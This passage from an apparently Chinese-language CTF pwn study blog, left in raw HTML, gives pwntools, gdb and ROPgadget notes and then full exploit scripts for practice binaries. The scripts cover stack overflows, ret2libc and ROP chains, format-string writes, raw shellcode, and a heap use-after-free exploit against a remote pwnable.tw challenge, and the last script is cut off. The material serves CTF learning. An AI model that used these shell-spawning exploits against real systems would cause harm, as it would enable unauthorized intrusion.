class="line">io.recvuntil(<span class="string">b":"</span>)</span><br><span class="line">io.recvuntil(<span class="string">b" : "</span>,drop = <span class="literal">True</span>)</span><br><span class="line">io.recv()</span><br><span class="line"><span class="comment">#Send message</span></span><br><span class="line">io.sendline(<span class="string">b"abc"</span>)</span><br><span class="line">io.send(p32(<span class="number">0</span>)+<span class="string">b"\x0a"</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b" :"</span>,str)</span><br><span class="line"><span class="comment">#Interactive</span></span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment">#shellcode</span></span><br><span class="line">shellcraft.sh()  <span class="comment">#in sh environment</span></span><br><span class="line">shellcraft.amd64.sh() <span class="comment">#64 bit</span></span><br><span class="line">asm(shellcraft.sh()) <span class="comment">#machine code</span></span><br><span class="line">asm(shellcraft.sh()).ljust(<span class="number">112</span>,<span class="string">b'a'</span>) <span class="comment">#if the length is less than 112,then it will be supplemented whith a. </span></span><br><span class="line"><span class="comment">#if you want to attack the 64 bit,pls add it</span></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"><span class="comment">#find strings</span></span><br><span class="line">elf = ELF(<span class="string">"./filename"</span>)</span><br><span class="line">hex(next(elf.search(<span class="string">b"/bin/sh"</span>)))</span><br><span class="line"><span class="comment">#elf file</span></span><br><span class="line">elf = ELF(<span class="string">"./file"</span>)</span><br><span class="line">hex(elf.got[<span class="string">"puts"</span>])</span><br><span class="line">hex(elf.plt[<span class="string">"system"</span>])</span><br><span class="line">hex(elf.symbols[<span class="string">"buf2"</span>])</span><br><span class="line"><span class="comment">#flat</span></span><br><span class="line">flat([<span class="number">1</span>,<span class="number">2</span>])</span><br><span class="line"><span class="comment">#generate data</span></span><br><span class="line">cyclic(<span class="number">60</span>)</span><br><span class="line"><span class="comment">#byte data</span></span><br><span class="line">p32(<span class="number">1234</span>)</span><br><span class="line">\xd2\x04\x00\x00</span><br><span class="line">u32(<span class="string">"\xd2\x04\x00\x00"</span>)</span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure><h2 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#start</span></span><br><span class="line">gdb file</span><br><span class="line">start</span><br><span class="line"><span class="comment">#run the executable</span></span><br><span class="line">run</span><br><span class="line"><span class="comment">#backtrace</span></span><br><span class="line">backtrace</span><br><span class="line"><span class="comment">#return</span></span><br><span class="line"><span class="built_in">return</span></span><br><span class="line"><span class="comment">#breakpoint</span></span><br><span class="line">b main</span><br><span class="line">b <span class="keyword">function</span></span><br><span class="line">b *0x</span><br><span class="line"><span class="comment">#information for breakpoint</span></span><br><span class="line">info b</span><br><span class="line"><span class="comment">#delete the breakpoint</span></span><br><span class="line">d num</span><br><span class="line"><span class="comment">#run</span></span><br><span class="line">r </span><br><span class="line"><span class="comment">#next step over</span></span><br><span class="line">n </span><br><span class="line"><span class="comment">#step in </span></span><br><span class="line">s  </span><br><span class="line"><span class="comment">#stack</span></span><br><span class="line">stack size</span><br><span class="line">stack 24</span><br><span class="line"><span class="comment">#virtual memory map</span></span><br><span class="line"><span class="comment">#to look rwx segment</span></span><br><span class="line">vmmap</span><br><span class="line"><span class="comment">#plt </span></span><br><span class="line">plt</span><br><span class="line">x p</span><br><span class="line">x/20 p</span><br><span class="line"><span class="comment">#got</span></span><br><span class="line">got</span><br><span class="line"><span class="comment">#chunk</span></span><br><span class="line">fastbin</span><br><span class="line">heap</span><br><span class="line"><span class="comment">#libc</span></span><br><span class="line">b *<span class="variable">$rebase</span>(0x18540)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">attach pid</span><br><span class="line"><span class="built_in">return</span></span><br></pre></td></tr></table></figure><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">G  直接跳转地址</span><br><span class="line">shift+f12  打开字符串窗口</span><br><span class="line">shift+E  提取字符串</span><br><span class="line">n  重命名变量</span><br></pre></td></tr></table></figure><h2 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary filename --only &quot;pop|ret&quot;</span><br></pre></td></tr></table></figure><h2 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libcbase + one_gadget_address</span><br></pre></td></tr></table></figure><h1 id="练习题"><a href="#练习题" class="headerlink" title="练习题"></a>练习题</h1><p>非常简单，适合入门</p><h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><h3 id="ret2text-1"><a href="#ret2text-1" class="headerlink" title="ret2text"></a>ret2text</h3><p>直接有后门函数，所以我们只需要把垃圾数据填满覆盖ebp，然后让返回地址返回后门函数的地址就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2text"</span>)</span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">20</span> + p32(<span class="number">0x8048522</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="ret2shellcode-1"><a href="#ret2shellcode-1" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>自己写入shellcode(bss)，然后溢出地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2shellcode"</span>)</span><br><span class="line"></span><br><span class="line">buf2 = <span class="number">0x804a080</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh()).ljust(<span class="number">112</span>,<span class="string">b'a'</span>)</span><br><span class="line">payload = shellcode + p32(buf2)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p>ROPgadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2syscall"</span>)</span><br><span class="line"></span><br><span class="line">pop_eax = <span class="number">0x80bb196</span></span><br><span class="line">pop_edx = <span class="number">0x806eb90</span></span><br><span class="line">int_80 = <span class="number">0x08049421</span></span><br><span class="line">payload =flat([ <span class="string">b'A'</span>* <span class="number">112</span> , pop_eax , <span class="number">0xb</span> ,pop_edx, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x80be408</span> ,int_80])</span><br><span class="line"></span><br><span class="line">print(io.recv())</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h3><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201107232027030.png" alt="image-20201107232027030"></p><p>栈溢出，有/bin/sh字符串 system@plt 构造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc1"</span>)</span><br><span class="line">io = process(<span class="string">"./ret2libc1"</span>)</span><br><span class="line">system_plt = elf.plt[<span class="string">"system"</span>]</span><br><span class="line">bin_sh = next(elf.search(<span class="string">b"/bin/sh"</span>))</span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x70</span> + p32(system_plt) + <span class="string">b'BBBB'</span> + p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h3><p>栈溢出 无/bin/sh字符串，但bss段可写</p><p>第一种</p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201112215451308.png" alt="image-20201112215451308"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2libc2"</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./ret2libc2"</span>)</span><br><span class="line">system_plt = elf.plt[<span class="string">"system"</span>]</span><br><span class="line">gets_plt = elf.plt[<span class="string">"gets"</span>]</span><br><span class="line">bss = <span class="number">0x804a080</span></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x70</span> + p32(gets_plt) + p32(system_plt) + p32(bss) + p32(bss)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b"/bin/sh\x00"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>第二种</p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201113183137009.png" alt="image-20201113183137009"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2libc2"</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./ret2libc2"</span>)</span><br><span class="line">system_plt = elf.plt[<span class="string">"system"</span>]</span><br><span class="line">gets_plt = elf.plt[<span class="string">"gets"</span>]</span><br><span class="line">bss = <span class="number">0x804a080</span></span><br><span class="line">pop_ebx_ret = <span class="number">0x804843d</span></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x70</span> + p32(gets_plt) + p32(pop_ebx_ret) + p32(bss) + p32(system_plt) + p32(pop_ebx_ret) + p32(bss)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b"/bin/bash\x00"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="retlibc3"><a href="#retlibc3" class="headerlink" title="retlibc3"></a>retlibc3</h3><p>栈变量的结构</p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201113202023659.png" alt="image-20201113202023659"></p><p>栈的结构</p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201113202640601.png" alt="image-20201113202640601"></p><p>泄露libc</p><p>应该是libc不同导致打不通</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">libc = ELF(<span class="string">"libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">put = elf.got[<span class="string">"puts"</span>]</span><br><span class="line">puts = libc.symbols[<span class="string">"puts"</span>]</span><br><span class="line">system = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">io.sendlineafter(<span class="string">b" :"</span>,str(put))</span><br><span class="line">io.recvuntil(<span class="string">b" : "</span>)</span><br><span class="line">libcbase = int(io.recvuntil(<span class="string">b"\n"</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - puts</span><br><span class="line">payload = flat( cyclic(<span class="number">60</span>), libcbase + system , <span class="number">0xdeadbeef</span> ,next(elf.search(<span class="string">b"sh\x00"</span>)))</span><br><span class="line">io.sendlineafter(<span class="string">b" :"</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn2-x64"><a href="#pwn2-x64" class="headerlink" title="pwn2_x64"></a>pwn2_x64</h3><p>栈图</p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201116200344612.png" alt="image-20201116200344612"></p><h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><ol><li>通过libc泄露系统函数，首先获得基地址可以通过以下来泄露（1）通过ROP系统调用（2）直接函数write泄露</li><li>无sh （1）符号有无sh  （2）通过ROP将/bin/sh写入 （3）libc中/bin/sh</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./level3"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./level3"</span>)</span><br><span class="line">vulfun_addr = <span class="number">0x0804844B</span>  </span><br><span class="line">write_plt = elf.symbols[<span class="string">"write"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line">payload1 = cyclic(<span class="number">0x88</span>+<span class="number">4</span>) + p32(write_plt) + p32(vulfun_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b"Input:\n"</span>)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>)) <span class="comment">#Specify four bytes</span></span><br><span class="line">libc_base = write_addr - libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">system_addr = libc.symbols[<span class="string">"system"</span>] + libc_base</span><br><span class="line">sh_addr = libc_base + next(libc.search(<span class="string">b"/bin/sh"</span>))</span><br><span class="line"><span class="comment">#libc_write=libc.symbols['write']</span></span><br><span class="line"><span class="comment">#libc_system=libc.symbols['system']</span></span><br><span class="line"><span class="comment">#libc_sh=next(libc.search(b'/bin/sh'))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#system_addr=write_addr-libc_write+libc_system </span></span><br><span class="line"><span class="comment">#sh_addr=write_addr-libc_write+libc_sh</span></span><br><span class="line">payload2 = cyclic(<span class="number">0x88</span>+<span class="number">4</span>) + p32(system_addr) + <span class="string">b'A'</span>*<span class="number">4</span> + p32(sh_addr)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn3-x64"><a href="#pwn3-x64" class="headerlink" title="pwn3_x64"></a>pwn3_x64</h3><p>两次ROP</p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117174620932.png" alt="image-20201117174620932"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117174719721.png" alt="image-20201117174719721"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="comment">#context.log_level="debug" </span></span><br><span class="line">elf=ELF(<span class="string">"level3_x64"</span>) </span><br><span class="line">write_plt=elf.symbols[<span class="string">"write"</span>] </span><br><span class="line">write_got=elf.got[<span class="string">"write"</span>] </span><br><span class="line">vul_addr=elf.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line">p = process(<span class="string">"./level3_x64"</span>)</span><br><span class="line"><span class="comment">#p=remote("47.116.107.8",9883) </span></span><br><span class="line">p.recvuntil(<span class="string">b"Input:\n"</span>) </span><br><span class="line">pop_rdi_addr=<span class="number">0x00000000004006b3</span>   <span class="comment">#0x00000000004006b3 : pop rdi ; ret</span></span><br><span class="line">pop_rsi_r15_addr=<span class="number">0x00000000004006b1</span>      <span class="comment">#0x00000000004006b1 : pop rsi ; pop r15 ; ret</span></span><br><span class="line">payload1 = cyclic(<span class="number">0x80</span>+<span class="number">8</span>) + p64(pop_rdi_addr) + p64(<span class="number">1</span>) + p64(pop_rsi_r15_addr) + p64(write_got) + p64(<span class="string">'deadbeef'</span>) + p64(write_plt) + p64(vul_addr) </span><br><span class="line">p.sendline(payload1) </span><br><span class="line">t=p.recv(<span class="number">8</span>)</span><br><span class="line">write_addr=u64(t[<span class="number">0</span>:<span class="number">8</span>]) </span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>) </span><br><span class="line">offset=write_addr-libc.symbols[<span class="string">"write"</span>] </span><br><span class="line">sys_addr=offset+libc.symbols[<span class="string">"system"</span>] </span><br><span class="line">bin_addr=offset+next(libc.search(<span class="string">b"/bin/sh"</span>))</span><br><span class="line">payload2 = cyclic(<span class="number">0x80</span>+<span class="number">8</span>) + p64(pop_rdi_addr) + p64(bin_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload2) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><h3 id="fmtstr1"><a href="#fmtstr1" class="headerlink" title="fmtstr1"></a>fmtstr1</h3><p>还是比较简单的</p><p>思路：将x的地址放到栈上，对应的获取栈上的地址相对于<code>printf</code>的第几个参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">conn=process(<span class="string">'./fmtstr1'</span>)</span><br><span class="line">e=ELF(<span class="string">'./fmtstr1'</span>)</span><br><span class="line">x_addr=<span class="number">0x0804A02C</span>                                      </span><br><span class="line">payload=p32(x_addr) + <span class="string">b"%11$n"</span></span><br><span class="line">conn.sendline(payload)</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><h3 id="fmstr2"><a href="#fmstr2" class="headerlink" title="fmstr2"></a>fmstr2</h3><p>这题很奇怪 X64  感觉是爆破出来的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%9$s</span><br></pre></td></tr></table></figure><h3 id="fmstr-uaf"><a href="#fmstr-uaf" class="headerlink" title="fmstr_uaf"></a>fmstr_uaf</h3><p>RWX打开，说明应该是返回shellcode</p><p>也就是栈上写shellcode</p><p>此外，还需要利用堆进行UAF</p><p>进行shellcode的调用</p><p>同时还有fmstr泄露main’rbp的位置</p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201122165900691.png" alt="image-20201122165900691"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">"./echo2"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./echo2"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"hey, what's your name? : "</span>)</span><br><span class="line">shellcode=<span class="string">b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"</span></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.recvuntil(<span class="string">b"&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">b"2"</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b"%10$p"</span>+<span class="string">b"A"</span>*<span class="number">3</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b"0x"</span>)</span><br><span class="line">shellcode_addr=int(p.recvuntil(<span class="string">b'AAA'</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)<span class="number">-0x20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b"&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">b"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">b"to exit? (y/n)"</span>)</span><br><span class="line">p.sendline(<span class="string">b"n"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b"&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">b"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">b"hello \n"</span>)</span><br><span class="line">p.sendline(<span class="string">b"A"</span>*<span class="number">24</span>+p64(shellcode_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="堆-1"><a href="#堆-1" class="headerlink" title="堆"></a>堆</h2><h3 id="heap1"><a href="#heap1" class="headerlink" title="heap1"></a>heap1</h3><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201122225712975.png" alt="image-20201122225712975"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201122225952773.png" alt="image-20201122225952773"></p><p>首先需要搞两个chunk(8byte)，free后，这样，我们fastbin中就会有两个8byte的chunk</p><p>之后我们在分配1个chunk，由于fastbin的缘故</p><p>我们就会把ptr[1]中的chunk直接拿过来</p><p>并且我们可以控制content size为8 我们也就把ptr[0]中的chunk拿了过来</p><p>从而达到了UAF</p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201122231126664.png" alt="image-20201122231126664"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201122231528599.png" alt="image-20201122231528599"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(*ptr[v1])(ptr[v1]);</span><br><span class="line">int self_puts(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  return puts(*(a1 + 4));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10102</span>)</span><br><span class="line"><span class="comment">#p=process("./hacknote")</span></span><br><span class="line">elf = ELF(<span class="string">"./hacknote"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line">read_got = elf.got[<span class="string">"read"</span>]</span><br><span class="line">pfputs = <span class="number">0x804862b</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span><span class="params">(size,index)</span>:</span></span><br><span class="line">      p.recvuntil(<span class="string">b"choice :"</span>)</span><br><span class="line">      p.sendline(<span class="string">b"1"</span>)</span><br><span class="line">      p.recvuntil(<span class="string">b"size :"</span>)</span><br><span class="line">      p.sendline(size)</span><br><span class="line">      p.recvuntil(<span class="string">b"Content :"</span>)</span><br><span class="line">      p.sendline(index)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span><span class="params">(index)</span>:</span></span><br><span class="line">      p.recvuntil(<span class="string">b"choice :"</span>)</span><br><span class="line">      p.sendline(<span class="string">b"2"</span>)</span><br><span class="line">      p.recvuntil(<span class="string">b"Index :"</span>)</span><br><span class="line">      p.sendline(index)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_note</span><span class="params">(index)</span>:</span></span><br><span class="line">      p.recvuntil(<span class="string">b"choice :"</span>)</span><br><span class="line">      p.sendline(<span class="string">b"3"</span>)</span><br><span class="line">      p.recvuntil(<span class="string">b"Index :"</span>)</span><br><span class="line">      p.sendline(index)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">add_note(<span class="string">b"16"</span>,<span class="string">b"aaaaa"</span>)</span><br><span class="line">add_note(<span class="string">b"16"</span>,<span class="string">b"aaaaa"</span>)</span><br><span class="line">delete_note(<span class="string">b'0'</span>)</span><br><span class="line">delete_note(<span 